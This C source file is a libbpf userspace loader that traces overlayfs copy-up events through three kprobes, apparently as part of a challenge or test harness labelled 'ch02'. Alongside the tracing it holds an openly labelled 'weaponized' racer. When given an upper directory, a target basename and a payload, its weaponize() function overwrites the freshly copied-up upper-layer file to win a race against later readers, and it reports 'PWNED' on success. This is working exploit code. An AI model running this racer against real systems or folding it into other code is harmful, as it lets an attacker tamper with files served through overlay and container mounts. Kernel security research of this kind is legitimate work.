// ch02 overlayfs — userspace loader + WEAPONIZED racer.
//
// Observes overlayfs copy-up events via three kprobes, streams {pid, comm,
// basename, inode, mode, hook} via ringbuf. Each absent symbol is disabled
// at load time so the loader runs cleanly on kernels missing any variant.
//
// WEAPONIZATION: when -r <upperdir> -t <basename> -w <payload> is given,
// the ringbuf handler reacts to matching copy-up events by opening
// "<upperdir>/<basename>" O_WRONLY|O_TRUNC and overwriting its contents
// with <payload>. This exploits the window between overlayfs promoting a
// file to the upper layer and a later reader pulling its contents through
// the merged mount. On every successful rewrite the loader prints a
// "[ch02] PWNED" marker line on stderr — harnesses can grep for it.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <getopt.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch02-overlayfs.skel.h"

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    char name[64];
    unsigned long ino;
    unsigned int mode;
    int hook;
};

static volatile sig_atomic_t stop;
static void on_signal(int sig)
{
    (void)sig;
    stop = 1;
}

// Weaponization state — set via CLI, read by ringbuf handler.
static const char *g_race_upperdir = NULL;
static const char *g_race_target   = NULL;
static const char *g_race_payload  = NULL;
static int         g_race_hits     = 0;

static const char *hook_name(int h)
{
    switch (h) {
    case 1: return "ovl_copy_up";
    case 2: return "ovl_maybe_copy_up";
    case 3: return "ovl_copy_up_with_data";
    default: return "?";
    }
}

static void weaponize(const char *basename)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/%s", g_race_upperdir, basename);

    int fd = -1;
    // Retry briefly — on ovl_maybe_copy_up the upper dentry may not be
    // fully instantiated yet. ~250ms cap is plenty for tmpfs overlays.
    for (int i = 0; i < 50; i++) {
        fd = open(path, O_WRONLY | O_TRUNC);
        if (fd >= 0) break;
        if (errno != ENOENT) break;
        usleep(5000);
    }
    if (fd < 0) {
        fprintf(stderr, "[ch02] PWNED-FAIL\tpath=%s\terr=%s\n",
                path, strerror(errno));
        return;
    }
    size_t n = strlen(g_race_payload);
    ssize_t w = write(fd, g_race_payload, n);
    close(fd);
    if (w == (ssize_t)n) {
        g_race_hits++;
        fprintf(stderr, "[ch02] PWNED\tpath=%s\tbytes=%zd\thits=%d\n",
                path, w, g_race_hits);
    } else {
        fprintf(stderr, "[ch02] PWNED-PARTIAL\tpath=%s\twrote=%zd\terr=%s\n",
                path, w, strerror(errno));
    }
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt))
        return 0;
    const struct evt *e = data;
    printf("[ch02] hook=%-22s\tpid=%u\tcomm=%-16s\tname=%-24s\tino=%lu\tmode=%o\n",
           hook_name(e->hook), e->pid, e->comm, e->name, e->ino, e->mode);
    fflush(stdout);

    if (g_race_upperdir && g_race_target && g_race_payload) {
        if (strncmp(e->name, g_race_target, sizeof(e->name)) == 0) {
            weaponize(e->name);
        }
    }
    return 0;
}

static int libbpf_print(enum libbpf_print_level lvl, const char *fmt, va_list ap)
{
    if (lvl == LIBBPF_DEBUG)
        return 0;
    return vfprintf(stderr, fmt, ap);
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s [-v] [-h] [-r UPPERDIR -t BASENAME -w PAYLOAD]\n"
            "  -v   verbose libbpf output\n"
            "  -r   upper dir path (weapon mode)\n"
            "  -t   target basename to race (weapon mode)\n"
            "  -w   payload to write to <upperdir>/<basename> on copy-up\n"
            "  -h   show this help\n",
            prog);
}

static int kallsyms_has(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        fprintf(stderr, "[ch02] open /proc/kallsyms: %s\n", strerror(errno));
        return -1;
    }
    char line[512];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char *name = strchr(line, ' ');
        if (!name) continue;
        name = strchr(name + 1, ' ');
        if (!name) continue;
        name++;
        size_t n = strlen(name);
        while (n && (name[n-1] == '\n' || name[n-1] == '\t' || name[n-1] == ' '))
            name[--n] = 0;
        char *br = strchr(name, '\t');
        if (br) *br = 0;
        if (strcmp(name, sym) == 0) {
            found = 1;
            break;
        }
    }
    fclose(f);
    return found;
}

struct probe_spec {
    const char *sym;
    struct bpf_program *prog;
    const char *prog_name;
};

int main(int argc, char **argv)
{
    int verbose = 0;
    int opt;
    while ((opt = getopt(argc, argv, "vhr:t:w:")) != -1) {
        switch (opt) {
        case 'v': verbose = 1; break;
        case 'r': g_race_upperdir = optarg; break;
        case 't': g_race_target   = optarg; break;
        case 'w': g_race_payload  = optarg; break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 2;
        }
    }
    if (optind != argc) {
        fprintf(stderr, "[ch02] unexpected argument: %s\n", argv[optind]);
        usage(argv[0]);
        return 2;
    }
    int weapon = (g_race_upperdir && g_race_target && g_race_payload);
    if ((g_race_upperdir || g_race_target || g_race_payload) && !weapon) {
        fprintf(stderr, "[ch02] -r, -t, -w must all be provided together\n");
        return 2;
    }
    if (weapon)
        fprintf(stderr, "[ch02] WEAPON armed\tupper=%s\ttarget=%s\tpayload_len=%zu\n",
                g_race_upperdir, g_race_target, strlen(g_race_payload));

    if (verbose)
        libbpf_set_print(libbpf_print);

    int rc = 1;
    struct ring_buffer *rb = NULL;
    struct ch02_overlayfs_bpf *s = ch02_overlayfs_bpf__open();
    if (!s) {
        fprintf(stderr, "[ch02] CH02_SKIP reason=\"skeleton open failed: %s\"\n",
                strerror(errno));
        return 1;
    }

    struct probe_spec probes[] = {
        { "ovl_copy_up",           s->progs.kp_cup,  "kp_cup"  },
        { "ovl_maybe_copy_up",     s->progs.kp_mcup, "kp_mcup" },
        { "ovl_copy_up_with_data", s->progs.kp_cupd, "kp_cupd" },
    };
    size_t n_probes = sizeof(probes) / sizeof(probes[0]);
    int kallsyms_ok = 1;
    for (size_t i = 0; i < n_probes; i++) {
        int h = kallsyms_has(probes[i].sym);
        if (h < 0) { kallsyms_ok = 0; break; }
        if (h == 0) {
            fprintf(stderr, "[ch02] symbol=%s\tstatus=absent\tprog=%s disabled\n",
                    probes[i].sym, probes[i].prog_name);
            if (bpf_program__set_autoload(probes[i].prog, false))
                fprintf(stderr, "[ch02] set_autoload(%s,false) failed\n",
                        probes[i].prog_name);
        } else {
            fprintf(stderr, "[ch02] symbol=%s\tstatus=present\n", probes[i].sym);
        }
    }
    if (!kallsyms_ok)
        fprintf(stderr, "[ch02] kallsyms unreadable — proceeding optimistically\n");

    int err = ch02_overlayfs_bpf__load(s);
    if (err) {
        fprintf(stderr, "[ch02] CH02_SKIP reason=\"load failed: %s\"\n", strerror(-err));
        goto out;
    }

    int n_attached = 0, n_skipped = 0;
    struct bpf_program *prog;
    bpf_object__for_each_program(prog, s->obj) {
        if (!bpf_program__autoload(prog)) {
            n_skipped++;
            continue;
        }
        struct bpf_link *link = bpf_program__attach(prog);
        long e = libbpf_get_error(link);
        if (e) {
            fprintf(stderr, "[ch02] attach prog=%s failed: %s\n",
                    bpf_program__name(prog), strerror(-(int)e));
            continue;
        }
        n_attached++;
    }
    fprintf(stderr, "[ch02] attached=%d\tskipped=%d\n", n_attached, n_skipped);
    if (n_attached == 0) {
        fprintf(stderr, "[ch02] no programs attached — overlayfs symbols missing\n");
        goto out;
    }

    rb = ring_buffer__new(bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch02] ring_buffer__new failed: %s\n", strerror(errno));
        goto out;
    }

    struct sigaction sa = { .sa_handler = on_signal };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    fprintf(stderr, "[ch02] status=ready\tmsg=overlay copy-up %s\n",
            weapon ? "RACER (weaponized)" : "observer");
    while (!stop) {
        int n = ring_buffer__poll(rb, 100);
        if (n < 0 && n != -EINTR) {
            fprintf(stderr, "[ch02] ring_buffer__poll: %s\n", strerror(-n));
            break;
        }
    }
    rc = 0;

out:
    if (rb)
        ring_buffer__free(rb);
    if (s)
        ch02_overlayfs_bpf__destroy(s);
    return rc;
}
